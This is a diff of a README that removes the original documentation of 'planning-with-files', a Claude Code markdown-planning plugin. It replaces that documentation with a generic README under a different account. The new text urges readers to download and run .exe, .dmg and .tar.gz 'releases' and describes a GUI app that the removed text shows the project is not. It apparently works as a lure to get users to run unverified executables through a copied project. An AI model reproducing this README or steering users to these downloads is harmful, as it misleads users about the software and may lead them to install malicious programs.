@@ -1,276 +1,65 @@
-# Planning with Files
+# 🎉 planning-with-files - Simplify Your Markdown Planning
 
-> **Work like Manus** — the AI agent company Meta acquired for **$2 billion**.
+## 📥 Download Now
+[![Download planning-with-files](https://img.shields.io/badge/Download-Now-blue)](https://github.com/SEPTMOON/planning-with-files/releases)
 
-## Thank You
+## 🚀 Getting Started
+Welcome to **planning-with-files**! This application lets you manage your markdown planning easily. No programming skills are needed. Just follow the steps below to start.
 
-To everyone who starred, forked, and shared this skill — thank you. This project blew up in less than 24 hours, and the support from the community has been incredible.
+## 🛠️ System Requirements
+To run **planning-with-files**, ensure you have the following:
 
-If this skill helps you work smarter, that's all I wanted.
+- Operating System: Windows 10 or later / macOS 10.15 or later / Linux (latest stable version recommended)
+- RAM: At least 4 GB
+- Disk Space: 100 MB free space
+- A modern web browser (for documentation)
 
----
+## 📋 Features
+- Easy markdown file management
+- Built-in templates for quick setup
+- Simple access to file systems
+- User-friendly interface
+- Offers persistent planning storage
 
-A Claude Code plugin that transforms your workflow to use persistent markdown files for planning, progress tracking, and knowledge storage — the exact pattern that made Manus worth billions.
+## 📄 Download & Install
+1. Visit the [Releases page](https://github.com/SEPTMOON/planning-with-files/releases) to find the latest version of **planning-with-files**.
+  
+2. Look for the most recent release with the highest version number. You will see several files listed. 
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code Plugin](https://img.shields.io/badge/Claude%20Code-Plugin-blue)](https://code.claude.com/docs/en/plugins)
-[![Claude Code Skill](https://img.shields.io/badge/Claude%20Code-Skill-green)](https://code.claude.com/docs/en/skills)
-[![Cursor Rules](https://img.shields.io/badge/Cursor-Rules-purple)](https://docs.cursor.com/context/rules-for-ai)
-[![Version](https://img.shields.io/badge/version-2.3.0-brightgreen)](https://github.com/OthmanAdi/planning-with-files/releases)
+3. Choose the file that matches your operating system. For example:
+   - For Windows, download `planning-with-files-windows.exe`.
+   - For macOS, download `planning-with-files-macos.dmg`.
+   - For Linux, download `planning-with-files-linux.tar.gz`.
 
-## Quick Install
+4. Click on the file to start the download. 
 
-```bash
-/plugin marketplace add OthmanAdi/planning-with-files
-/plugin install planning-with-files@planning-with-files
-```
+5. Once the download is complete, locate the file in your downloads folder.
 
-See [docs/installation.md](docs/installation.md) for all installation methods.
+6. Run the file:
+   - **Windows**: Double-click the `.exe` file. Follow the installation instructions.
+   - **macOS**: Open the `.dmg` file, drag the application into your Applications folder, then run it from there.
+   - **Linux**: Extract the `.tar.gz` file and follow the included instructions for installation.
 
-## Supported IDEs
+## 🌟 How to Use
+After installation, you can start using **planning-with-files**:
 
-| IDE | Status | Installation Guide | Format |
-|-----|--------|-------------------|--------|
-| Claude Code | ✅ Full Support | [Installation](docs/installation.md) | Plugin + SKILL.md |
-| Cursor | ✅ Full Support | [Cursor Setup](docs/cursor.md) | Rules |
-| Kilocode | ✅ Full Support | [Kilocode Setup](docs/kilocode.md) | Rules |
-| OpenCode | ✅ Full Support | [OpenCode Setup](docs/opencode.md) | Personal/Project Skill |
-| Codex | ✅ Full Support | [Codex Setup](docs/codex.md) | Personal Skill |
+1. Open the application from your Applications folder (macOS) or Start Menu (Windows).
+  
+2. You will see a welcome screen. Here, you can create a new markdown file or open an existing one.
 
-## Documentation
+3. Use the toolbar to format your text, add links, and create lists. 
 
-| Document | Description |
-|----------|-------------|
-| [Installation Guide](docs/installation.md) | All installation methods (plugin, manual, Cursor, Windows) |
-| [Quick Start](docs/quickstart.md) | 5-step guide to using the pattern |
-| [Workflow Diagram](docs/workflow.md) | Visual diagram of how files and hooks interact |
-| [Troubleshooting](docs/troubleshooting.md) | Common issues and solutions |
-| [Cursor Setup](docs/cursor.md) | Cursor IDE-specific instructions |
-| [Windows Setup](docs/windows.md) | Windows-specific notes |
-| [Kilo Code Support](docs/kilocode.md) | Kilo Code integration guide |
-| [Codex Setup](docs/codex.md) | Codex IDE installation and usage |
-| [OpenCode Setup](docs/opencode.md) | OpenCode IDE installation, oh-my-opencode config |
+4. Save your planning file regularly to keep your work safe.
 
-## Versions
+5. To access your files easily, the application integrates with your file system, so you can organize them as you like.
 
-| Version | Features | Install |
-|---------|----------|---------|
-| **v2.3.0** (current) | Codex & OpenCode IDE support | `/plugin install planning-with-files@planning-with-files` |
-| **v2.2.2** | Restored skill activation language | See [releases](https://github.com/OthmanAdi/planning-with-files/releases) |
-| **v2.2.1** | Session recovery after /clear, enhanced PreToolUse hook | See [releases](https://github.com/OthmanAdi/planning-with-files/releases) |
-| **v2.2.0** | Kilo Code IDE support, Windows PowerShell support, OS-aware hooks | See [releases](https://github.com/OthmanAdi/planning-with-files/releases) |
-| **v2.1.2** | Fix template cache issue (Issue #18) | See [releases](https://github.com/OthmanAdi/planning-with-files/releases) |
-| **v2.1.0** | Claude Code v2.1 compatible, PostToolUse hook, user-invocable | See [releases](https://github.com/OthmanAdi/planning-with-files/releases) |
-| **v2.0.x** | Hooks, templates, scripts | See [releases](https://github.com/OthmanAdi/planning-with-files/releases) |
-| **v1.0.0** (legacy) | Core 3-file pattern | `git clone -b legacy` |
+## 📝 Documentation
+Detailed documentation is available on our [GitHub Wiki](https://github.com/SEPTMOON/planning-with-files/wiki). Here, you can find guides on advanced features, tips on markdown formatting, and troubleshooting information.
 
-See [CHANGELOG.md](CHANGELOG.md) for details.
+## 💬 Support
+If you have questions or need support, please open an issue on our [GitHub Issues page](https://github.com/SEPTMOON/planning-with-files/issues). Our community is here to help you.
 
-## Why This Skill?
+## 👥 Contributing
+We welcome contributions! If you'd like to help improve **planning-with-files**, please check our [Contributing guidelines](https://github.com/SEPTMOON/planning-with-files/blob/main/CONTRIBUTING.md). 
 
-On December 29, 2025, [Meta acquired Manus for $2 billion](https://techcrunch.com/2025/12/29/meta-just-bought-manus-an-ai-startup-everyone-has-been-talking-about/). In just 8 months, Manus went from launch to $100M+ revenue. Their secret? **Context engineering**.
-
-> "Markdown is my 'working memory' on disk. Since I process information iteratively and my active context has limits, Markdown files serve as scratch pads for notes, checkpoints for progress, building blocks for final deliverables."
-> — Manus AI
-
-## The Problem
-
-Claude Code (and most AI agents) suffer from:
-
-- **Volatile memory** — TodoWrite tool disappears on context reset
-- **Goal drift** — After 50+ tool calls, original goals get forgotten
-- **Hidden errors** — Failures aren't tracked, so the same mistakes repeat
-- **Context stuffing** — Everything crammed into context instead of stored
-
-## The Solution: 3-File Pattern
-
-For every complex task, create THREE files:
-
-```
-task_plan.md      → Track phases and progress
-findings.md       → Store research and findings
-progress.md       → Session log and test results
-```
-
-### The Core Principle
-
-```
-Context Window = RAM (volatile, limited)
-Filesystem = Disk (persistent, unlimited)
-
-→ Anything important gets written to disk.
-```
-
-## Usage
-
-Once installed, Claude will automatically:
-
-1. **Create `task_plan.md`** before starting complex tasks
-2. **Re-read plan** before major decisions (via PreToolUse hook)
-3. **Remind you** to update status after file writes (via PostToolUse hook)
-4. **Store findings** in `findings.md` instead of stuffing context
-5. **Log errors** for future reference
-6. **Verify completion** before stopping (via Stop hook)
-
-Or invoke manually with `/planning-with-files`.
-
-See [docs/quickstart.md](docs/quickstart.md) for the full 5-step guide.
-
-## Session Recovery (NEW in v2.2.0)
-
-When your context window fills up and you run `/clear`, this skill automatically recovers unsynced work from your previous session.
-
-### Optimal Workflow
-
-For the best experience, we recommend:
-
-1. **Disable auto-compact** in Claude Code settings (use full context window)
-2. **Start a fresh session** in your project
-3. **Run `/planning-with-files`** when ready to work on a complex task
-4. **Work until context fills up** (Claude will warn you)
-5. **Run `/clear`** to start fresh
-6. **Run `/planning-with-files`** again — it will automatically recover where you left off
-
-### How Recovery Works
-
-When you invoke `/planning-with-files`, the skill:
-
-1. Checks for previous session data (stored in `~/.claude/projects/`)
-2. Finds the last time planning files were updated
-3. Extracts conversation that happened after (potentially lost context)
-4. Shows a catchup report so you can sync planning files
-
-This means even if context filled up before you could update your planning files, the skill will recover that context in your next session.
-
-### Disabling Auto-Compact
-
-To use the full context window without automatic compaction:
-
-```bash
-# In your Claude Code settings or .claude/settings.json
-{
-  "autoCompact": false
-}
-```
-
-This lets you maximize context usage before manually clearing with `/clear`.
-
-## Key Rules
-
-1. **Create Plan First** — Never start without `task_plan.md`
-2. **The 2-Action Rule** — Save findings after every 2 view/browser operations
-3. **Log ALL Errors** — They help avoid repetition
-4. **Never Repeat Failures** — Track attempts, mutate approach
-
-## File Structure
-
-```
-planning-with-files/
-├── templates/               # Root-level templates (for CLAUDE_PLUGIN_ROOT)
-├── scripts/                 # Root-level scripts (for CLAUDE_PLUGIN_ROOT)
-├── docs/                    # Documentation
-│   ├── installation.md
-│   ├── quickstart.md
-│   ├── workflow.md
-│   ├── troubleshooting.md
-│   ├── cursor.md
-│   ├── windows.md
-│   ├── kilocode.md
-│   ├── codex.md
-│   └── opencode.md
-├── planning-with-files/     # Plugin skill folder
-│   ├── SKILL.md
-│   ├── templates/
-│   └── scripts/
-├── skills/                  # Legacy skill folder
-│   └── planning-with-files/
-│       ├── SKILL.md
-│       ├── examples.md
-│       ├── reference.md
-│       ├── templates/
-│       └── scripts/
-│           ├── init-session.sh
-│           ├── check-complete.sh
-│           ├── init-session.ps1   # Windows PowerShell
-│           └── check-complete.ps1 # Windows PowerShell
-├── .codex/                  # Codex IDE installation guide
-│   └── INSTALL.md
-├── .opencode/               # OpenCode IDE installation guide
-│   └── INSTALL.md
-├── .claude-plugin/          # Plugin manifest
-├── .cursor/                 # Cursor rules
-├── .kilocode/               # Kilo Code rules
-│   └── rules/
-│       └── planning-with-files.md
-├── CHANGELOG.md
-├── LICENSE
-└── README.md
-```
-
-## The Manus Principles
-
-| Principle | Implementation |
-|-----------|----------------|
-| Filesystem as memory | Store in files, not context |
-| Attention manipulation | Re-read plan before decisions (hooks) |
-| Error persistence | Log failures in plan file |
-| Goal tracking | Checkboxes show progress |
-| Completion verification | Stop hook checks all phases |
-
-## When to Use
-
-**Use this pattern for:**
-- Multi-step tasks (3+ steps)
-- Research tasks
-- Building/creating projects
-- Tasks spanning many tool calls
-
-**Skip for:**
-- Simple questions
-- Single-file edits
-- Quick lookups
-
-## Kilo Code Support
-
-This skill also supports Kilo Code AI through the `.kilocode/rules/` directory.
-
-The [`.kilocode/rules/planning-with-files.md`](.kilocode/rules/planning-with-files.md) file contains all the planning guidelines formatted for Kilo Code's rules system, providing the same Manus-style planning workflow for Kilo Code users.
-
-**Windows users:** The skill now includes PowerShell scripts ([`init-session.ps1`](skills/planning-with-files/scripts/init-session.ps1) and [`check-complete.ps1`](skills/planning-with-files/scripts/check-complete.ps1)) for native Windows support.
-
-See [docs/kilocode.md](docs/kilocode.md) for detailed Kilo Code integration guide.
-
-## Community Forks
-
-| Fork | Author | Features |
-|------|--------|----------|
-| [devis](https://github.com/st01cs/devis) | [@st01cs](https://github.com/st01cs) | Interview-first workflow, `/devis:intv` and `/devis:impl` commands, guaranteed activation |
-| [multi-manus-planning](https://github.com/kmichels/multi-manus-planning) | [@kmichels](https://github.com/kmichels) | Multi-project support, SessionStart git sync |
-
-*Built something? Open an issue to get listed!*
-
-## Acknowledgments
-
-- **Manus AI** — For pioneering context engineering patterns
-- **Anthropic** — For Claude Code, Agent Skills, and the Plugin system
-- **Lance Martin** — For the detailed Manus architecture analysis
-- Based on [Context Engineering for AI Agents](https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus)
-
-## Contributing
-
-Contributions welcome! Please:
-1. Fork the repository
-2. Create a feature branch
-3. Submit a pull request
-
-## License
-
-MIT License — feel free to use, modify, and distribute.
-
----
-
-**Author:** [Ahmad Othman Ammar Adi](https://github.com/OthmanAdi)
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=OthmanAdi/planning-with-files&type=Date)](https://star-history.com/#OthmanAdi/planning-with-files&Date)
+Thank you for using **planning-with-files**. We hope it makes your planning smoother and more enjoyable!
